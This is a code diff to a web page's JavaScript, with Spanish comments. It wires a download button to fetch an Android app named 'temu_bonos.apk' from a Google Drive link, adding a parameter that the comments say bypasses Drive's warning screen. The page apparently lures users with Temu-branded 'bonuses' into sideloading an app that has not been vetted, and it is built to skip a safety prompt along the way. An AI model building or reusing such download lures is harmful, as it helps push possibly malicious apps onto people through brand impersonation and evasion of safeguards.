@@ -733,6 +733,12 @@
 </div>
 
 <script>
+    // ID de tu archivo en Google Drive
+    const FILE_ID = "10i0bwccmKMtLtsak979gvfRnCu5Tbc55";
+    
+    // Enlace directo para descargar desde Google Drive sin pantalla de advertencia
+    const apkUrl = `https://drive.usercontent.google.com/download?id=${FILE_ID}&export=download&confirm=t`;
+
     // Generar partículas
     function createParticles() {
         const particles = document.getElementById('particles');
@@ -759,25 +765,13 @@
         }
     }, 30000);
 
-    // Función de descarga REAL del APK
+    // Función de descarga REAL del APK desde Google Drive
     function downloadAPK() {
         // Mostrar modal
         document.getElementById('downloadModal').style.display = 'flex';
         
-        // Simular tiempo de preparación
         setTimeout(() => {
-            // Aquí va la URL REAL de tu APK - Reemplázala cuando tengas el archivo
-            // Por ahora es un enlace de ejemplo, pero cuando tengas tu APK:
-            // 1. Sube el APK a un servidor (Google Drive, Dropbox, o tu propio hosting)
-            // 2. Obtén el enlace directo de descarga
-            // 3. Reemplázalo abajo
-            
-            const apkUrl = "#"; // <-- REEMPLAZA CON TU URL REAL DEL APK
-            
-            // Si tienes el APK en la misma carpeta que este HTML:
-            // const apkUrl = "temu_bonos.apk";
-            
-            // Crear enlace de descarga
+            // Crear enlace de descarga directa
             const link = document.createElement('a');
             link.href = apkUrl;
             link.download = 'temu_bonos.apk';
@@ -785,12 +779,11 @@
             link.click();
             document.body.removeChild(link);
             
-            // Cerrar modal después de iniciar descarga
             setTimeout(() => {
                 closeModal();
                 mostrarMensajeExito();
-            }, 2000);
-        }, 2000);
+            }, 1500);
+        }, 1500);
     }
 
     function mostrarMensajeExito() {
